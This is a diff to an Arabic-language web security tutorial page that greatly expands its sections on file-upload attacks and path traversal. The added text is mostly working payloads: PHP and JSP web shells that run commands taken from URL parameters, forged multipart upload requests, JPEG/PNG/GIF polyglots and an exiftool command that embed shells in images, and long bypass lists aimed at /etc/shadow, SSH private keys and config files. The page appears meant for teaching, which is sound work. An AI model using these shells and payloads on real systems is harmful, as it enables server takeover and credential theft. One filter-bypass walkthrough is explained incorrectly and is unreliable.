@@ -522,55 +522,353 @@
 
             <h3 class="subsection-title"><i class="fas fa-unlock"></i> 1. Unrestricted File Upload</h3>
             <div class="highlight-box">
-                <h4><i class="fas fa-info-circle"></i> الوصف</h4>
-                <p>عدم وجود أي قيود على نوع الملفات المرفوعة.</p>
+                <h4><i class="fas fa-info-circle"></i> التحليل التقني المعمق</h4>
+                <p><strong>ثغرة Unrestricted File Upload</strong> تحدث عندما يفشل التطبيق في تطبيق أي آليات تحقق أو تصفية على الملفات المرفوعة. هذا النوع من الثغرات يعتبر الأخطر على الإطلاق لأنه يتيح للمهاجم تحميل أي نوع من الملفات دون قيود.</p>
+                
+                <p><strong>الآلية التقنية:</strong></p>
+                <ul>
+                    <li>التطبيق يقبل المدخل من المستخدم مباشرة دون فحص</li>
+                    <li>لا يوجد فحص لامتداد الملف (File Extension)</li>
+                    <li>لا يوجد فحص لنوع المحتوى (MIME Type)</li>
+                    <li>لا يوجد فحص للبيانات الداخلية (Magic Bytes)</li>
+                </ul>
+
+                <p><strong>سيناريو الهجوم الكامل:</strong></p>
                 <div class="payload-box">
-                    <strong>Web Shell بسيط:</strong><br>
-                    <code>&lt;?php echo file_get_contents('/etc/passwd'); ?&gt;</code>
+                    <strong>المرحلة 1 - إنشاء Web Shell متقدم:</strong><br>
+                    <code>&lt;?php<br>
+                    if(isset($_GET['cmd'])) {<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;$cmd = $_GET['cmd'];<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;$output = shell_exec($cmd . ' 2>&1');<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;echo "&lt;pre&gt;" . htmlspecialchars($output) . "&lt;/pre&gt;";<br>
+                    }<br>
+                    ?&gt;</code>
                 </div>
+
+                <div class="payload-box">
+                    <strong>المرحلة 2 - استخدام Web Shell:</strong><br>
+                    <code>GET /uploads/shell.php?cmd=whoami HTTP/1.1<br>
+                    GET /uploads/shell.php?cmd=cat /etc/passwd<br>
+                    GET /uploads/shell.php?cmd=netstat -tulnp</code>
+                </div>
+
+                <p><strong>التأثير الأمني:</strong></p>
+                <ul>
+                    <li><strong>Remote Code Execution (RCE):</strong> تنفيذ أوامر على مستوى نظام التشغيل</li>
+                    <li><strong>Data Exfiltration:</strong> سرقة قواعد البيانات والملفات الحساسة</li>
+                    <li><strong>Privilege Escalation:</strong> رفع الصلاحيات داخل النظام</li>
+                    <li><strong>Lateral Movement:</strong> الانتشار في الشبكة الداخلية</li>
+                    <li><strong>Persistent Access:</strong> إنشاء backdoors دائمة</li>
+                </ul>
             </div>
 
             <h3 class="subsection-title"><i class="fas fa-file-code"></i> 2. Content-Type Bypass</h3>
             <div class="highlight-box">
-                <h4><i class="fas fa-info-circle"></i> الوصف</h4>
-                <p>تجاوز فحص Content-Type عبر تعديل الـ Header.</p>
+                <h4><i class="fas fa-info-circle"></i> التحليل التقني المعمق</h4>
+                <p><strong>ثغرة Content-Type Bypass</strong> تستغل الثقة الخاطئة التي يضعها المطورون في HTTP headers القابلة للتحكم من قبل المستخدم. هذه الثغرة شائعة جداً في التطبيقات التي تعتمد فقط على فحص MIME Type للتحقق من نوع الملف.</p>
+                
+                <p><strong>الفهم العميق للمشكلة:</strong></p>
+                <ul>
+                    <li><strong>Client-Side Control:</strong> المستخدم يتحكم بالكامل في HTTP headers</li>
+                    <li><strong>Server-Side Trust:</strong> الخادم يثق في البيانات القادمة من العميل</li>
+                    <li><strong>Validation Gap:</strong> عدم وجود فحص إضافي للمحتوى الفعلي</li>
+                </ul>
+
+                <p><strong>الطلب الطبيعي vs الطلب المعدل:</strong></p>
                 <div class="payload-box">
-                    <strong>Payload:</strong><br>
-                    <code>Content-Type: image/jpeg  // بدلاً من application/x-php</code>
+                    <strong>الطلب الطبيعي (يتم رفضه):</strong><br>
+                    <code>POST /upload HTTP/1.1<br>
+                    Content-Type: multipart/form-data; boundary=boundary123<br><br>
+                    --boundary123<br>
+                    Content-Disposition: form-data; name="file"; filename="evil.php"<br>
+                    Content-Type: application/x-php<br><br>
+                    &lt;?php system($_GET['cmd']); ?&gt;<br>
+                    --boundary123--</code>
+                </div>
+
+                <div class="payload-box">
+                    <strong>الطلب المعدل (يتم قبوله):</strong><br>
+                    <code>POST /upload HTTP/1.1<br>
+                    Content-Type: multipart/form-data; boundary=boundary123<br><br>
+                    --boundary123<br>
+                    Content-Disposition: form-data; name="file"; filename="evil.php"<br>
+                    Content-Type: image/jpeg    // مُزيف<br><br>
+                    &lt;?php system($_GET['cmd']); ?&gt;<br>
+                    --boundary123--</code>
+                </div>
+
+                <p><strong>تقنيات التجاوز المتقدمة:</strong></p>
+                <ul>
+                    <li><strong>MIME Type Spoofing:</strong> استخدام أنواع MIME مختلفة</li>
+                    <li><strong>Charset Manipulation:</strong> تعديل charset في Content-Type</li>
+                    <li><strong>Boundary Confusion:</strong> استغلال parsing errors في multipart</li>
+                </ul>
+
+                <div class="payload-box">
+                    <strong>أمثلة تقنيات متقدمة:</strong><br>
+                    <code>Content-Type: image/jpeg; charset=utf-8<br>
+                    Content-Type: text/plain<br>
+                    Content-Type: application/octet-stream<br>
+                    Content-Type: multipart/mixed</code>
                 </div>
             </div>
 
             <h3 class="subsection-title"><i class="fas fa-ban"></i> 3. Extension Blacklist Bypass</h3>
             <div class="highlight-box">
-                <h4><i class="fas fa-info-circle"></i> التقنيات المستخدمة</h4>
+                <h4><i class="fas fa-info-circle"></i> التحليل التقني المعمق</h4>
+                <p><strong>ثغرة Extension Blacklist Bypass</strong> تستغل القصور في آليات منع الامتدادات الخطيرة. المشكلة الأساسية هي أن الـ Blacklisting يعتمد على قائمة محدودة من الامتدادات المحظورة، بينما يوجد المئات من الامتدادات القابلة للتنفيذ.</p>
+                
+                <p><strong>لماذا تفشل قوائم المنع؟</strong></p>
                 <ul>
-                    <li><strong>Alternative Extensions:</strong> .php5, .phtml, .phar</li>
-                    <li><strong>Case Manipulation:</strong> .PHP, .Php</li>
-                    <li><strong>Null Byte Injection:</strong> shell.php%00.jpg</li>
-                    <li><strong>Double Extensions:</strong> shell.php.jpg</li>
-                    <li><strong>Trailing Characters:</strong> shell.php.</li>
+                    <li><strong>Incomplete Coverage:</strong> من المستحيل حصر جميع الامتدادات الخطيرة</li>
+                    <li><strong>Server Variations:</strong> خوادم مختلفة تدعم امتدادات مختلفة</li>
+                    <li><strong>Configuration Dependencies:</strong> الامتدادات تعتمد على إعدادات الخادم</li>
+                    <li><strong>Evolution Factor:</strong> امتدادات جديدة تظهر باستمرار</li>
                 </ul>
+
+                <p><strong>التصنيف الشامل لتقنيات التجاوز:</strong></p>
+
+                <div class="payload-box">
+                    <strong>1. Alternative Extensions (امتدادات بديلة):</strong><br>
+                    <code>// PHP Alternatives<br>
+                    .php3, .php4, .php5, .php7, .php8<br>
+                    .phtml, .pht, .phps, .phar, .phpt<br>
+                    .inc, .hphp, .ctp<br><br>
+
+                    // ASP.NET Alternatives<br>
+                    .asp, .aspx, .ascx, .ashx, .asmx<br>
+                    .axd, .config, .cs, .vb<br><br>
+
+                    // JSP Alternatives<br>
+                    .jsp, .jspx, .jsw, .jsv, .jspf<br>
+                    .war, .ear, .jar</code>
+                </div>
+
+                <div class="payload-box">
+                    <strong>2. Case Manipulation (تلاعب الأحرف):</strong><br>
+                    <code>shell.PHP       // Upper case<br>
+                    shell.Php       // Mixed case<br>
+                    shell.pHp       // Random case<br>
+                    shell.PhP       // Alternate case</code>
+                </div>
+
+                <div class="payload-box">
+                    <strong>3. Null Byte Injection:</strong><br>
+                    <code>shell.php%00.jpg     // URL encoded null byte<br>
+                    shell.php\x00.png    // Hex null byte<br>
+                    shell.php;.gif       // Semicolon (some parsers)<br>
+                    shell.php:.jpg       // Colon (Windows)</code>
+                </div>
+
+                <div class="payload-box">
+                    <strong>4. Double Extensions:</strong><br>
+                    <code>shell.php.jpg        // Simple double<br>
+                    shell.jpg.php        // Reverse double<br>
+                    image.php.jpeg       // Camouflaged<br>
+                    file.txt.php         // Text disguise</code>
+                </div>
+
+                <div class="payload-box">
+                    <strong>5. Trailing Characters:</strong><br>
+                    <code>shell.php.          // Trailing dot<br>
+                    shell.php..         // Multiple dots<br>
+                    shell.php           // Trailing space<br>
+                    shell.php%20        // URL encoded space</code>
+                </div>
+
+                <div class="payload-box">
+                    <strong>6. Unicode/UTF-8 Bypass:</strong><br>
+                    <code>shell.php%C0%2E     // Overlong encoding<br>
+                    shell.php%C0%AE      // UTF-8 overlong<br>
+                    shell.php%EF%BC%8E   // Fullwidth period</code>
+                </div>
+
+                <p><strong>تقنية الـ Nested Removal:</strong></p>
+                <p>بعض التطبيقات تحاول إزالة الامتدادات الخطيرة، لكن تفعل ذلك مرة واحدة فقط:</p>
+                <div class="payload-box">
+                    <code>shell.p.phphp       // يصبح shell.php بعد إزالة .php مرة واحدة<br>
+                    file.as.aspp        // يصبح file.asp<br>
+                    evil.ph.phptml      // يصبح evil.phtml</code>
+                </div>
             </div>
 
             <h3 class="subsection-title"><i class="fas fa-folder"></i> 4. Path Traversal in Upload</h3>
             <div class="highlight-box">
-                <h4><i class="fas fa-info-circle"></i> الوصف</h4>
-                <p>استخدام Path Traversal لرفع الملفات في مجلدات قابلة للتنفيذ.</p>
+                <h4><i class="fas fa-info-circle"></i> التحليل التقني المعمق</h4>
+                <p><strong>ثغرة Path Traversal في File Upload</strong> تمثل تهديداً مضاعفاً حيث تجمع بين خطورة رفع الملفات الخبيثة وخطورة التحكم في مكان حفظها. هذا يتيح للمهاجم رفع ملفات في مجلدات قابلة للتنفيذ أو الكتابة فوق ملفات نظام حساسة.</p>
+                
+                <p><strong>الفهم العميق للثغرة:</strong></p>
+                <ul>
+                    <li><strong>Directory Traversal:</strong> التنقل خارج المجلد المخصص للتحميل</li>
+                    <li><strong>File Overwrite:</strong> الكتابة فوق ملفات النظام المهمة</li>
+                    <li><strong>Executable Placement:</strong> وضع الملفات في مجلدات قابلة للتنفيذ</li>
+                    <li><strong>Configuration Hijacking:</strong> تعديل ملفات الإعداد</li>
+                </ul>
+
+                <p><strong>سيناريوهات الهجوم المتقدمة:</strong></p>
+
                 <div class="payload-box">
-                    <strong>Payload:</strong><br>
-                    <code>filename="../../../var/www/html/shell.php"</code>
+                    <strong>1. الهروب إلى Web Root:</strong><br>
+                    <code>filename="../../../var/www/html/backdoor.php"<br>
+                    filename="../../../../apache2/htdocs/shell.jsp"<br>
+                    filename="../../../public_html/webshell.aspx"</code>
                 </div>
+
+                <div class="payload-box">
+                    <strong>2. الكتابة فوق ملفات النظام:</strong><br>
+                    <code>filename="../../../etc/passwd"          // Linux users<br>
+                    filename="../../../etc/shadow"          // Password hashes<br>
+                    filename="../../../../Windows/system32/drivers/etc/hosts"</code>
+                </div>
+
+                <div class="payload-box">
+                    <strong>3. تعديل ملفات الإعداد:</strong><br>
+                    <code>filename="../.htaccess"              // Apache config<br>
+                    filename="../web.config"             // IIS config<br>
+                    filename="../../../etc/apache2/apache2.conf"</code>
+                </div>
+
+                <div class="payload-box">
+                    <strong>4. استغلال Symbolic Links:</strong><br>
+                    <code>// إنشاء symbolic link إلى ملف حساس<br>
+                    filename="../../../tmp/link_to_passwd"<br>
+                    // المحتوى: ملف يحتوي على symbolic link</code>
+                </div>
+
+                <p><strong>التقنيات المتقدمة للتجاوز:</strong></p>
+
+                <div class="payload-box">
+                    <strong>URL Encoding Variations:</strong><br>
+                    <code>filename="..%2f..%2f..%2fetc%2fpasswd"         // Standard encoding<br>
+                    filename="..%252f..%252f..%252fetc%252fpasswd"   // Double encoding<br>
+                    filename="..%c0%af..%c0%af..%c0%afetc%c0%afpasswd" // UTF-8 overlong</code>
+                </div>
+
+                <div class="payload-box">
+                    <strong>OS-Specific Techniques:</strong><br>
+                    <code>// Windows<br>
+                    filename="..\\..\\..\\windows\\system32\\cmd.exe"<br>
+                    filename="..%5c..%5c..%5cwindows%5csystem32%5ccmd.exe"<br><br>
+
+                    // Unix/Linux<br>
+                    filename="../../../bin/sh"<br>
+                    filename="..%2f..%2f..%2fbin%2fsh"</code>
+                </div>
+
+                <p><strong>تأثيرات الأمان المتقدمة:</strong></p>
+                <ul>
+                    <li><strong>System Compromise:</strong> السيطرة الكاملة على النظام</li>
+                    <li><strong>Service Disruption:</strong> تعطيل الخدمات عبر الكتابة فوق الملفات</li>
+                    <li><strong>Privilege Escalation:</strong> رفع الصلاحيات عبر تعديل ملفات النظام</li>
+                    <li><strong>Data Integrity Loss:</strong> فقدان سلامة البيانات</li>
+                </ul>
             </div>
 
             <h3 class="subsection-title"><i class="fas fa-image"></i> 5. Magic Bytes / File Header Bypass</h3>
             <div class="highlight-box">
-                <h4><i class="fas fa-info-circle"></i> الوصف</h4>
-                <p>إضافة Magic Bytes للملفات لتبدو كصور حقيقية.</p>
+                <h4><i class="fas fa-info-circle"></i> التحليل التقني المعمق</h4>
+                <p><strong>ثغرة Magic Bytes Bypass</strong> تستغل الطريقة التي تتعامل بها التطبيقات مع فحص محتوى الملفات. Magic Bytes هي البايتات الأولى من الملف التي تحدد نوعه الحقيقي، وهي طريقة أكثر موثوقية من فحص الامتداد أو MIME type.</p>
+                
+                <p><strong>فهم Magic Bytes:</strong></p>
+                <p>كل نوع ملف له signature فريد في البداية. هذه الـ signatures تُستخدم من قبل نظام التشغيل والتطبيقات لتحديد نوع الملف بصرف النظر عن امتداده.</p>
+
                 <div class="payload-box">
-                    <strong>JPEG Magic Bytes + PHP:</strong><br>
-                    <code>FF D8 FF E0 00 10 4A 46 49 46<br>
-                    &lt;?php echo system($_GET['cmd']); ?&gt;</code>
+                    <strong>Magic Bytes الشائعة:</strong><br>
+                    <code>// Image Files<br>
+                    JPEG: FF D8 FF E0 00 10 4A 46 49 46    // ÿØÿà..JFIF<br>
+                    PNG:  89 50 4E 47 0D 0A 1A 0A          // .PNG....<br>
+                    GIF:  47 49 46 38 39 61                // GIF89a<br>
+                    BMP:  42 4D                            // BM<br><br>
+
+                    // Archive Files<br>
+                    ZIP:  50 4B 03 04                      // PK..<br>
+                    RAR:  52 61 72 21 1A 07 00             // Rar!...<br>
+                    7Z:   37 7A BC AF 27 1C                // 7z¼¯'..<br><br>
+
+                    // Document Files<br>
+                    PDF:  25 50 44 46 2D                   // %PDF-<br>
+                    DOC:  D0 CF 11 E0 A1 B1 1A E1          // Ðϑà¡±.á</code>
                 </div>
+
+                <p><strong>تقنيات Polyglot Files:</strong></p>
+                <p>الهدف هو إنشاء ملف يحتوي على magic bytes صحيحة مع كود خبيث قابل للتنفيذ.</p>
+
+                <div class="payload-box">
+                    <strong>JPEG + PHP Polyglot:</strong><br>
+                    <code>FF D8 FF E0 00 10 4A 46 49 46 00 01    // JPEG Header<br>
+                    &lt;?php<br>
+                    /* JPEG Comment Section - يخفي الكود */<br>
+                    if(isset($_GET['c'])) {<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;echo "&lt;pre&gt;";<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;system($_GET['c']);<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;echo "&lt;/pre&gt;";<br>
+                    }<br>
+                    // باقي بيانات JPEG...<br>
+                    ?&gt;</code>
+                </div>
+
+                <div class="payload-box">
+                    <strong>PNG + PHP Polyglot:</strong><br>
+                    <code>89 50 4E 47 0D 0A 1A 0A              // PNG Signature<br>
+                    00 00 00 0D 49 48 44 52              // IHDR chunk<br>
+                    // PNG metadata...<br>
+                    &lt;?php system($_GET['cmd']); ?&gt;<br>
+                    // PNG data continues...</code>
+                </div>
+
+                <div class="payload-box">
+                    <strong>GIF + JSP Polyglot:</strong><br>
+                    <code>GIF89a                                // GIF Header<br>
+                    &lt;%@ page import="java.io.*" %&gt;<br>
+                    &lt;%<br>
+                    if (request.getParameter("cmd") != null) {<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;// باقي الكود...<br>
+                    }<br>
+                    %&gt;</code>
+                </div>
+
+                <p><strong>تقنيات متقدمة لتجاوز الفحص:</strong></p>
+
+                <div class="payload-box">
+                    <strong>1. EXIF Data Injection (JPEG):</strong><br>
+                    <code>// إخفاء PHP code في EXIF metadata<br>
+                    JPEG Header + EXIF data containing:<br>
+                    &lt;?php eval($_GET['e']); ?&gt;</code>
+                </div>
+
+                <div class="payload-box">
+                    <strong>2. PNG tEXt Chunk Abuse:</strong><br>
+                    <code>// استخدام PNG text chunks لإخفاء الكود<br>
+                    PNG Header<br>
+                    tEXt chunk: "&lt;?php system($_GET['c']); ?&gt;"</code>
+                </div>
+
+                <div class="payload-box">
+                    <strong>3. ZIP Comment Injection:</strong><br>
+                    <code>// إخفاء كود في ZIP file comment<br>
+                    ZIP Header<br>
+                    ZIP Comment: "&lt;?php include($_GET['f']); ?&gt;"</code>
+                </div>
+
+                <p><strong>أدوات إنشاء Polyglot Files:</strong></p>
+                <div class="payload-box">
+                    <code>// باستخدام ExifTool<br>
+                    exiftool -Comment='&lt;?php system($_GET["c"]); ?&gt;' image.jpg<br><br>
+
+                    // باستخدام hexedit لتعديل البايتات مباشرة<br>
+                    hexedit malicious_image.jpg<br><br>
+
+                    // إنشاء polyglot يدوياً<br>
+                    python polyglot_generator.py --type jpeg --payload shell.php</code>
+                </div>
+
+                <p><strong>اختبار فعالية Polyglot:</strong></p>
+                <ul>
+                    <li><strong>File Command:</strong> <code>file malicious.jpg</code> يجب أن يعرض "JPEG image"</li>
+                    <li><strong>Image Viewers:</strong> يجب أن تعرض الصورة بشكل طبيعي</li>
+                    <li><strong>Web Server:</strong> يجب أن ينفذ PHP code عند الطلب</li>
+                </ul>
             </div>
         </div>
 
@@ -800,63 +1098,318 @@
 
             <h3 class="subsection-title"><i class="fas fa-arrow-up"></i> 1. Simple Path Traversal</h3>
             <div class="highlight-box">
-                <h4><i class="fas fa-info-circle"></i> الوصف</h4>
-                <p>استخدام .. للانتقال للمجلد الأعلى.</p>
+                <h4><i class="fas fa-info-circle"></i> التحليل التقني المعمق</h4>
+                <p><strong>ثغرة Simple Path Traversal</strong> هي الشكل الأساسي لهجمات Directory Traversal، حيث يستغل المهاجم الرموز <code>../</code> للتنقل خارج المجلد المسموح والوصول إلى ملفات النظام الحساسة. هذه الثغرة تحدث عندما يفشل التطبيق في تطهير أو فلترة مدخلات المستخدم بشكل صحيح.</p>
+                
+                <p><strong>الآلية التقنية الداخلية:</strong></p>
+                <ul>
+                    <li><strong>Parent Directory Navigation:</strong> استخدام <code>../</code> للانتقال إلى المجلد الأب</li>
+                    <li><strong>Path Resolution:</strong> نظام التشغيل يحل المسار نسبياً من الموقع الحالي</li>
+                    <li><strong>Access Control Bypass:</strong> تجاوز قيود الوصول المفروضة على المجلدات</li>
+                    <li><strong>File System Traversal:</strong> استكشاف بنية نظام الملفات</li>
+                </ul>
+
+                <p><strong>سيناريوهات الهجوم المتدرجة:</strong></p>
+
                 <div class="payload-box">
-                    <strong>Payload:</strong><br>
-                    <code>../../../etc/passwd</code>
+                    <strong>المرحلة 1 - استطلاع أولي:</strong><br>
+                    <code>// اختبار عدد المستويات المطلوبة<br>
+                    ../etc/passwd           // مستوى واحد<br>
+                    ../../etc/passwd        // مستويان<br>
+                    ../../../etc/passwd     // ثلاثة مستويات<br>
+                    ../../../../etc/passwd  // أربعة مستويات</code>
                 </div>
+
+                <div class="payload-box">
+                    <strong>المرحلة 2 - استخراج ملفات النظام:</strong><br>
+                    <code>// Linux/Unix Systems<br>
+                    ../../../etc/passwd     // قائمة المستخدمين<br>
+                    ../../../etc/shadow     // كلمات المرور المشفرة<br>
+                    ../../../etc/group      // مجموعات المستخدمين<br>
+                    ../../../etc/hosts      // DNS المحلي<br>
+                    ../../../proc/version   // معلومات النظام<br>
+                    ../../../proc/cmdline   // معاملات التشغيل</code>
+                </div>
+
+                <div class="payload-box">
+                    <strong>المرحلة 3 - استخراج ملفات التطبيق:</strong><br>
+                    <code>// Web Application Files<br>
+                    ../../../var/www/html/config.php    // إعدادات قاعدة البيانات<br>
+                    ../../../var/log/apache2/access.log // سجلات الوصول<br>
+                    ../../../var/log/apache2/error.log  // سجلات الأخطاء<br>
+                    ../../../home/user/.ssh/id_rsa      // مفاتيح SSH<br>
+                    ../../../home/user/.bash_history    // تاريخ الأوامر</code>
+                </div>
+
+                <p><strong>التأثير الأمني الشامل:</strong></p>
+                <ul>
+                    <li><strong>Information Disclosure:</strong> كشف معلومات النظام والمستخدمين</li>
+                    <li><strong>Credential Harvesting:</strong> الحصول على كلمات المرور والمفاتيح</li>
+                    <li><strong>System Reconnaissance:</strong> استطلاع بنية النظام والتطبيقات</li>
+                    <li><strong>Privilege Escalation Preparation:</strong> جمع معلومات لرفع الصلاحيات</li>
+                </ul>
             </div>
 
             <h3 class="subsection-title"><i class="fas fa-shield-alt"></i> 2. Absolute Path Bypass</h3>
             <div class="highlight-box">
-                <h4><i class="fas fa-info-circle"></i> الوصف</h4>
-                <p>استخدام المسار المطلق عند حظر sequences التنقل.</p>
+                <h4><i class="fas fa-info-circle"></i> التحليل التقني المعمق</h4>
+                <p><strong>تقنية Absolute Path Bypass</strong> تستغل ضعف في آليات الحماية التي تحاول منع استخدام <code>../</code> فقط، لكنها تتجاهل المسارات المطلقة. هذه التقنية فعالة جداً عندما يحاول المطورون حماية التطبيق من Path Traversal بطرق سطحية.</p>
+                
+                <p><strong>الفهم العميق للتقنية:</strong></p>
+                <ul>
+                    <li><strong>Root Directory Access:</strong> البدء مباشرة من الجذر <code>/</code></li>
+                    <li><strong>Filter Bypass:</strong> تجاوز الفلاتر التي تبحث عن <code>../</code> فقط</li>
+                    <li><strong>Direct Path Specification:</strong> تحديد المسار الكامل للملف المطلوب</li>
+                    <li><strong>Operating System Agnostic:</strong> تعمل على معظم أنظمة التشغيل</li>
+                </ul>
+
+                <p><strong>سيناريوهات الهجوم المتقدمة:</strong></p>
+
                 <div class="payload-box">
-                    <strong>Payload:</strong><br>
-                    <code>/etc/passwd</code>
+                    <strong>Linux/Unix Systems - ملفات النظام الأساسية:</strong><br>
+                    <code>/etc/passwd                    // معلومات المستخدمين<br>
+                    /etc/shadow                    // كلمات المرور المشفرة<br>
+                    /etc/group                     // مجموعات النظام<br>
+                    /etc/hosts                     // إعدادات DNS المحلي<br>
+                    /etc/resolv.conf               // إعدادات DNS<br>
+                    /etc/ssh/sshd_config           // إعدادات SSH<br>
+                    /etc/apache2/sites-available/default  // إعدادات Apache</code>
                 </div>
+
+                <div class="payload-box">
+                    <strong>System Information & Logs:</strong><br>
+                    <code>/proc/version                  // معلومات الكيرنل<br>
+                    /proc/cpuinfo                  // معلومات المعالج<br>
+                    /proc/meminfo                  // معلومات الذاكرة<br>
+                    /proc/mounts                   // نقاط التحميل<br>
+                    /var/log/syslog                // سجل النظام<br>
+                    /var/log/auth.log              // سجل المصادقة<br>
+                    /var/log/apache2/access.log    // سجل الوصول</code>
+                </div>
+
+                <div class="payload-box">
+                    <strong>Application & User Files:</strong><br>
+                    <code>/var/www/html/config.php      // إعدادات التطبيق<br>
+                    /var/www/html/.htaccess        // إعدادات Apache<br>
+                    /home/user/.bash_history       // تاريخ الأوامر<br>
+                    /home/user/.ssh/id_rsa         // مفتاح SSH الخاص<br>
+                    /home/user/.ssh/authorized_keys // المفاتيح المصرح بها<br>
+                    /root/.mysql_history           // تاريخ MySQL</code>
+                </div>
+
+                <p><strong>استراتيجيات الاستغلال المتقدمة:</strong></p>
+                <ul>
+                    <li><strong>Configuration File Hunting:</strong> البحث عن ملفات الإعداد التي تحتوي على كلمات مرور</li>
+                    <li><strong>Log File Analysis:</strong> تحليل ملفات السجل لاكتشاف أنماط الاستخدام</li>
+                    <li><strong>Backup File Discovery:</strong> البحث عن ملفات النسخ الاحتياطية</li>
+                    <li><strong>Key Material Extraction:</strong> استخراج المفاتيح والشهادات</li>
+                </ul>
             </div>
 
             <h3 class="subsection-title"><i class="fas fa-code"></i> 3. URL Encoding Bypass</h3>
             <div class="highlight-box">
-                <h4><i class="fas fa-info-circle"></i> الوصف</h4>
-                <p>تشفير الرموز لتجاوز الفلاتر.</p>
+                <h4><i class="fas fa-info-circle"></i> التحليل التقني المعمق</h4>
+                <p><strong>تقنية URL Encoding Bypass</strong> تستغل الطريقة التي تتعامل بها التطبيقات مع URL decoding في مراحل مختلفة من معالجة الطلب. المشكلة تكمن في أن الفلترة قد تحدث قبل أو بعد عملية URL decoding، مما يتيح للمهاجم تجاوز الحماية.</p>
+                
+                <p><strong>فهم عملية URL Decoding:</strong></p>
+                <ul>
+                    <li><strong>Multi-Stage Processing:</strong> الطلب يمر بعدة مراحل معالجة</li>
+                    <li><strong>Decoding Timing:</strong> قد يحدث decoding قبل أو بعد الفلترة</li>
+                    <li><strong>Character Set Confusion:</strong> تفسير مختلف للحروف المشفرة</li>
+                    <li><strong>Parser Inconsistencies:</strong> اختلاف في تحليل البيانات المشفرة</li>
+                </ul>
+
+                <p><strong>التصنيف الشامل لتقنيات التشفير:</strong></p>
+
                 <div class="payload-box">
-                    <strong>Payloads:</strong><br>
-                    <code>%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd</code><br>
-                    <code>..%252f..%252f..%252fetc/passwd</code> (Double encoding)
+                    <strong>1. Standard URL Encoding:</strong><br>
+                    <code>../../../etc/passwd           // الشكل الأصلي<br>
+                    %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd   // مشفر بالكامل<br>
+                    %2e%2e/%2e%2e/%2e%2e/etc/passwd  // مشفر جزئياً<br>
+                    ..%2f..%2f..%2fetc%2fpasswd      // slash فقط مشفر</code>
+                </div>
+
+                <div class="payload-box">
+                    <strong>2. Double URL Encoding:</strong><br>
+                    <code>%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd<br>
+                    // شرح: %25 = % مشفر، لذا %252e = %.2e = ..<br>
+                    %252e%252e%252f = ../ بعد double decoding</code>
+                </div>
+
+                <div class="payload-box">
+                    <strong>3. Unicode/UTF-8 Overlong Encoding:</strong><br>
+                    <code>%c0%ae%c0%ae%c0%af              // ../ في UTF-8 overlong<br>
+                    %e0%80%ae%e0%80%ae%e0%80%af      // ../ في UTF-8 triple byte<br>
+                    %c1%9c%c1%9c%c1%1c              // ../ بطريقة أخرى</code>
+                </div>
+
+                <div class="payload-box">
+                    <strong>4. Mixed Case Hex Encoding:</strong><br>
+                    <code>%2E%2E%2F                     // حروف كبيرة<br>
+                    %2e%2E%2f                     // مختلطة<br>
+                    %2E%2e%2F                     // متنوعة</code>
+                </div>
+
+                <p><strong>تقنيات التجاوز المتقدمة:</strong></p>
+
+                <div class="payload-box">
+                    <strong>Testing Strategy لكشف التقنية الفعالة:</strong><br>
+                    <code>// اختبار تدريجي<br>
+                    1. ../../../etc/passwd         // Standard<br>
+                    2. %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd  // Single encoding<br>
+                    3. %252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd // Double<br>
+                    4. %c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd // Unicode<br>
+                    5. مزج التقنيات المختلفة</code>
                 </div>
             </div>
 
             <h3 class="subsection-title"><i class="fas fa-cut"></i> 4. Non-Recursive Filter Bypass</h3>
             <div class="highlight-box">
-                <h4><i class="fas fa-info-circle"></i> الوصف</h4>
-                <p>تجاوز الفلاتر التي تحذف ../ مرة واحدة فقط.</p>
+                <h4><i class="fas fa-info-circle"></i> التحليل التقني المعمق</h4>
+                <p><strong>ثغرة Non-Recursive Filter Bypass</strong> تستغل عيباً شائعاً في تصميم آليات الحماية، حيث يقوم التطبيق بإزالة أو استبدال النصوص الخطيرة مرة واحدة فقط، دون التحقق من وجود نصوص خطيرة جديدة قد تتكون بعد عملية الإزالة الأولى.</p>
+                
+                <p><strong>فهم آلية الفشل في الفلترة:</strong></p>
+                <ul>
+                    <li><strong>Single Pass Filtering:</strong> الفلتر يعمل مرة واحدة فقط</li>
+                    <li><strong>String Reconstruction:</strong> النصوص المتبقية تتحد لتكوين payload خطير</li>
+                    <li><strong>Pattern Reformation:</strong> الأنماط المحظورة تتشكل من جديد</li>
+                    <li><strong>Developer Assumption:</strong> افتراض خاطئ أن مرة واحدة كافية</li>
+                </ul>
+
+                <p><strong>أمثلة تفصيلية لآلية العمل:</strong></p>
+
                 <div class="payload-box">
-                    <strong>Payload:</strong><br>
-                    <code>....//....//....//etc/passwd</code>
+                    <strong>المثال الأساسي - إزالة "../":</strong><br>
+                    <code>// الـ payload الأصلي<br>
+                    ....//....//....//etc/passwd<br><br>
+
+                    // الخطوة 1: الفلتر يزيل "../" الأولى<br>
+                    ....//....//....//etc/passwd → ..//....//....//etc/passwd<br><br>
+
+                    // النتيجة النهائية (مازال خطير!)<br>
+                    //....//....//etc/passwd → ../../../etc/passwd</code>
+                </div>
+
+                <div class="payload-box">
+                    <strong>تقنيات Nested Patterns المتقدمة:</strong><br>
+                    <code>..../                          // يصبح ../ بعد إزالة ../<br>
+                    ....\                          // للأنظمة التي تدعم \<br>
+                    ....\/                         // مزج / و \<br>
+                    ....//                         // double slash<br>
+                    ..../\                         // مزج separators</code>
+                </div>
+
+                <div class="payload-box">
+                    <strong>تقنية الـ Nested Removal:</strong><br>
+                    <code>// بعض التطبيقات تحاول إزالة الامتدادات الخطيرة، لكن تفعل ذلك مرة واحدة فقط:<br>
+                    ....//....//....//etc/passwd   // يصبح ../../../etc/passwd<br>
+                    ......///......///......///etc/passwd // triple nesting<br>
+                    ..../\..../\..../\etc/passwd   // mixed separators</code>
                 </div>
             </div>
 
